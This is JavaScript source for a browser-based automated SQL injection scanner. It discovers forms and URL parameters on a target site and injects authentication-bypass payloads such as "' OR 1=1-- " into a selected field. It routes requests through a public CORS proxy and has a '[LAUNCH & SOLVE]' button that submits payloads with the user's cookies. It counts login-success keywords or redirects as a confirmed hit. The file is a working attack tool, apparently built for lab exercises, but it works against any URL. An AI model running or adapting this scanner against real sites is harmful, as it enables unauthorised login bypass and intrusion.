/**
 * Automated SQLi Scanner Logic - v3.1 (Method-Adjustable)
 * Handles form detection, URL parameter extraction, and interactive HUD method switching.
 */

class AutomatedSQLiScanner {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.forms = [];
        this.results = [];
        this.useProxy = false;
        this.errorCount400 = 0;
    }

    applyProxy(url) {
        if (!this.useProxy) return url;
        const proxyPrefix = 'https://corsproxy.io/?';
        return proxyPrefix + encodeURIComponent(url);
    }

    async discover() {
        const log = (msg, type = 'info') => { if (window.automatedLogCallback) window.automatedLogCallback(msg, type); };
        log(`[DISCOVERY] Fetching: ${this.targetUrl}`, 'info');

        // Reset forms for fresh discovery
        this.forms = [];

        // Extract URL Parameters first (GET-Query based)
        try {
            const urlObj = new URL(this.targetUrl);
            const queryParams = Array.from(urlObj.searchParams.entries());
            if (queryParams.length > 0) {
                const urlInputs = queryParams.map(([name, value]) => ({
                    name,
                    type: 'url-param',
                    value
                }));
                this.forms.push({
                    index: 99, // Special index for URL params
                    action: urlObj.origin + urlObj.pathname,
                    method: 'GET',
                    inputs: urlInputs,
                    isLogin: false,
                    isUrlQuery: true
                });
                log(`[DISCOVERY] Extracted URL Parameters: ${urlInputs.map(i => i.name).join(', ')}`, 'success');
            }
        } catch (e) {
            log(`[ERROR] Invalid URL format for parameter extraction.`, 'error');
        }

        try {
            const response = await fetch(this.targetUrl, { cache: 'no-cache', credentials: 'include' });
            const html = await response.text();
            this.useProxy = false;
            this.parseForms(html);
            this.updateSecurityStatus('green', 'DIRECT (Cookies Enabled)');
            return true;
        } catch (error) {
            log(`[DISCOVERY] Local fetch blocked. Using Proxy...`, 'warning');
            this.updateSecurityStatus('yellow', 'PROXY (Cookies Blocked)');
        }

        try {
            this.useProxy = true;
            const response = await fetch(this.applyProxy(this.targetUrl), { cache: 'no-cache', credentials: 'omit' });
            const html = await response.text();
            this.parseForms(html);
            return true;
        } catch (error) {
            log(`[ERROR] Discovery failed: ${error.message}`, 'error');
            this.updateSecurityStatus('red', 'ERROR (Check URL)');
            return false;
        }
    }

    updateSecurityStatus(color, text) {
        const statusEl = document.getElementById('security-status');
        if (statusEl) {
            statusEl.style.color = color;
            statusEl.textContent = text;
        }
    }

    parseForms(html) {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const formElements = doc.querySelectorAll('form');

        formElements.forEach((form, index) => {
            const action = form.getAttribute('action') || '';
            const method = (form.getAttribute('method') || 'POST').toUpperCase();
            const inputs = Array.from(form.querySelectorAll('input, select, textarea')).map(input => ({
                name: input.getAttribute('name') || '',
                type: input.getAttribute('type') || (input.tagName === 'TEXTAREA' ? 'textarea' : 'text'),
                value: input.getAttribute('value') || ''
            }));

            this.forms.push({
                index,
                action: new URL(action, this.targetUrl).href,
                method,
                inputs,
                isLogin: inputs.some(i => i.name?.toLowerCase().match(/username|user|email|login/))
            });

            if (window.automatedLogCallback) {
                const paramList = inputs.map(i => `${i.name || '[unnamed]'} (${i.type})`).join(', ');
                window.automatedLogCallback(`[DISCOVERY] Form ${index} (${method}): ${paramList}`, 'info');
            }
        });
    }

    static launchPayload(action, method, dataMap) {
        // Create a temporary form to submit top-level (bypasses CORS, uses native cookies)
        const form = document.createElement('form');
        form.method = method;
        form.action = action;
        form.target = '_blank';

        for (const key in dataMap) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = dataMap[key];
            form.appendChild(input);
        }

        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    async testSQLi(formAction, formMethod, usernameField, overrideData) {
        const baseValue = overrideData[usernameField] || '';
        const payloads = ["'-- ", "' OR 1=1-- ", "' #", "' OR '1'='1'-- "];
        this.errorCount400 = 0;

        for (const payload of payloads) {
            const data = new URLSearchParams();
            const injectionValue = baseValue + payload;
            const currentProbeSet = {};

            for (const name in overrideData) {
                const val = name === usernameField ? injectionValue : overrideData[name];
                data.append(name, val);
                currentProbeSet[name] = val;
            }

            const rawData = data.toString();

            try {
                // Build the full target URL with query params FIRST
                let targetWithParams = formAction;
                if (formMethod === 'GET') {
                    const urlObj = new URL(formAction);
                    urlObj.search = ''; // Clear to ensure fresh parameters
                    data.forEach((v, k) => urlObj.searchParams.append(k, v));
                    targetWithParams = urlObj.href;
                }

                const requestUrl = this.applyProxy(targetWithParams);
                const fetchOptions = {
                    method: formMethod,
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    redirect: 'manual',
                    credentials: this.useProxy ? 'omit' : 'include'
                };

                if (formMethod === 'POST') {
                    fetchOptions.body = rawData;
                }

                const response = await fetch(requestUrl, fetchOptions);
                let body = '';
                try { body = await response.text(); } catch (e) { }

                const isVulnerable = this.analyzeResponse(response, body);

                if (window.automatedLogCallback) {
                    let statusMsg = `Probe: ${injectionValue} [${formMethod}] -> Status: ${response.status}`;
                    if (response.status === 400) {
                        statusMsg += " (Session Mismatch)";
                        this.errorCount400++;
                    }
                    window.automatedLogCallback(statusMsg, response.status === 400 ? 'warning' : 'info', {
                        action: formAction,
                        method: formMethod,
                        data: currentProbeSet
                    });
                }

                if (isVulnerable) return { vulnerable: true, payload: injectionValue };
            } catch (error) {
                if (window.automatedLogCallback) window.automatedLogCallback(`Error: ${error.message}`, 'error');
            }
        }

        if (this.errorCount400 >= 1 && this.useProxy) {
            const troubleshooting = document.getElementById('cors-troubleshooting');
            if (troubleshooting) troubleshooting.style.display = 'block';
        }

        return { vulnerable: false };
    }

    analyzeResponse(response, body) {
        const successKeywords = ['Logout', 'Log out', 'My Account', 'Welcome', 'Dashboard'];
        const hasSuccessKeyword = successKeywords.some(keyword => new RegExp(keyword, 'i').test(body));
        const isRedirect = response.status === 302 || response.status === 301 || response.type === 'opaqueredirect';
        const errorSignatures = [/sql syntax/i, /mysql_fetch/i, /postgresql.*?error/i, /syntax error/i];
        const hasError = body && errorSignatures.some(sig => sig.test(body));
        return hasSuccessKeyword || isRedirect || hasError;
    }
}

window.AutomatedSQLiScanner = AutomatedSQLiScanner;

document.addEventListener('DOMContentLoaded', () => {
    const autoBtn = document.getElementById('automated-scan-btn');
    const resumeBtn = document.getElementById('resume-audit-btn');
    const addParamBtn = document.getElementById('add-param-btn');
    const overrideSection = document.getElementById('form-override-section');
    const paramsContainer = document.getElementById('form-params-container');
    const targetInput = document.getElementById('target-url');
    const troubleshooting = document.getElementById('cors-troubleshooting');

    let currentScanner = null;

    const log = (msg, type = 'info', probeContext = null) => {
        const logContent = document.getElementById('attack-log');
        if (logContent) {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            const time = new Date().toLocaleTimeString();
            let html = `[${time}] ${msg}`;

            if (probeContext) {
                html += ` <a href="#" class="launch-link" style="color:var(--clr-accent); margin-left:8px; font-weight:bold; text-decoration:underline;">[LAUNCH & SOLVE]</a>`;
            }

            entry.innerHTML = html;

            if (probeContext) {
                entry.querySelector('.launch-link').onclick = (e) => {
                    e.preventDefault();
                    AutomatedSQLiScanner.launchPayload(probeContext.action, probeContext.method, probeContext.data);
                };
            }

            logContent.appendChild(entry);
            logContent.scrollTop = logContent.scrollHeight;
        }
    };

    window.automatedLogCallback = log;

    const createParamRow = (name = '', value = '', isTarget = false) => {
        const isCsrf = name.toLowerCase().match(/csrf|token/);
        const wrapper = document.createElement('div');
        wrapper.className = 'param-row';
        wrapper.style = 'display:flex; align-items:flex-end; gap:0.5rem; padding:0.5rem; background:rgba(255,255,255,0.05); border-radius:4px; margin-bottom: 0.5rem;';

        let labelColor = 'var(--clr-dim)';
        let labelText = 'VALUE';
        let borderStyle = '1px solid rgba(255,255,255,0.1)';

        if (isCsrf && currentScanner && currentScanner.useProxy) {
            labelColor = 'var(--clr-accent)';
            labelText = 'SYNC TOKEN';
            borderStyle = '1px solid var(--clr-accent)';
        }

        wrapper.innerHTML = `
            <div style="flex:1;">
                <label style="display:block; font-size:0.65rem; color:var(--clr-dim); margin-bottom:0.2rem;">NAME</label>
                <input type="text" class="param-name input" value="${name}" style="width:100%; padding:0.4rem; font-size:0.8rem;">
            </div>
            <div style="flex:2;">
                <label style="display:block; font-size:0.65rem; color:${labelColor}; margin-bottom:0.2rem; font-weight:bold;">${labelText}</label>
                <input type="text" class="param-value input" value="${value}" style="width:100%; padding:0.4rem; font-size:0.8rem; border:${borderStyle};" placeholder="${isCsrf ? 'Paste token from target...' : ''}">
            </div>
            <div style="text-align:center;">
                <label style="display:block; font-size:0.65rem; color:var(--clr-accent); margin-bottom:0.2rem;">TARGET</label>
                <input type="radio" name="sqli-target" class="param-target" ${isTarget ? 'checked' : ''}>
            </div>
        `;
        paramsContainer.appendChild(wrapper);
    };

    if (autoBtn) {
        autoBtn.addEventListener('click', async () => {
            const url = targetInput.value.trim();
            if (!url) { alert('Please enter a Target URL.'); return; }
            currentScanner = new AutomatedSQLiScanner(url);
            document.getElementById('attack-section').style.display = 'block';
            overrideSection.style.display = 'none';
            if (troubleshooting) troubleshooting.style.display = 'none';
            log(`Starting Sequence: ${url}`, 'success');
            await currentScanner.discover();

            // Choose the best form to start with
            const form = currentScanner.forms.find(f => f.isLogin) || currentScanner.forms[0] || { action: url, method: 'POST', inputs: [] };

            // Build the HUD Header with Method Toggle
            paramsContainer.innerHTML = `
                <div style="grid-column: span 3; background: rgba(0,0,0,0.2); padding: 0.8rem; border-radius: 4px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 1rem;">
                    <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                        <div style="flex: 3; min-width: 250px;">
                            <label style="display:block; font-size:0.65rem; color:var(--clr-dim); margin-bottom:0.3rem;">TARGET ENDPOINT</label>
                            <input type="text" id="hud-target-action" class="input" value="${form.action}" style="width:100%; padding: 0.4rem; font-size: 0.8rem; border-color: rgba(255,255,255,0.1);">
                        </div>
                        <div style="flex: 1; min-width: 100px;">
                            <label style="display:block; font-size:0.65rem; color:var(--clr-accent); margin-bottom:0.3rem;">VERB (METHOD)</label>
                            <select id="hud-target-method" class="input" style="width:100%; padding: 0.4rem; font-size: 0.8rem; border-color: var(--clr-accent);">
                                <option value="GET" ${form.method === 'GET' ? 'selected' : ''}>GET</option>
                                <option value="POST" ${form.method === 'POST' ? 'selected' : ''}>POST</option>
                            </select>
                        </div>
                    </div>
                </div>
            `;

            if (!form.inputs || form.inputs.length === 0) {
                createParamRow('', '', true);
            } else {
                form.inputs.forEach((input, i) => {
                    createParamRow(input.name, input.value, input.name?.toLowerCase().match(/username|user|email|login/) || (i === 0));
                });
            }

            overrideSection.style.display = 'block';
            overrideSection.scrollIntoView({ behavior: 'smooth' });
            if (window.lucide) window.lucide.createIcons();
            log('Discovery complete. Verify mapping and choose TARGET.', 'warning');

            if (currentScanner.useProxy) {
                log('TIP: If 404/400 errors occur, toggle the VERB (GET/POST) in the HUD header.', 'info');
            }
        });
    }

    if (addParamBtn) addParamBtn.addEventListener('click', () => createParamRow());

    if (resumeBtn) {
        resumeBtn.addEventListener('click', async () => {
            const overrideData = {};
            let targetField = '';

            // Read updated action and method from HUD
            const targetAction = document.getElementById('hud-target-action').value.trim();
            const targetMethod = document.getElementById('hud-target-method').value;

            paramsContainer.querySelectorAll('.param-row').forEach(row => {
                const name = row.querySelector('.param-name').value.trim();
                const value = row.querySelector('.param-value').value;
                if (name) { overrideData[name] = value; if (row.querySelector('.param-target').checked) targetField = name; }
            });

            if (!targetField) { alert('Select a target parameter.'); return; }

            overrideSection.style.display = 'none';
            log(`Auditing ${targetAction} [${targetMethod}]...`, 'info');
            const result = await currentScanner.testSQLi(targetAction, targetMethod, targetField, overrideData);

            if (result.vulnerable) {
                log(`CONFIRMED: ${result.payload}`, 'success');
            } else {
                log('Cycle complete. Try [LAUNCH & SOLVE] with the opposite VERB if you hit 404.', 'warning');
            }
        });
    }
});
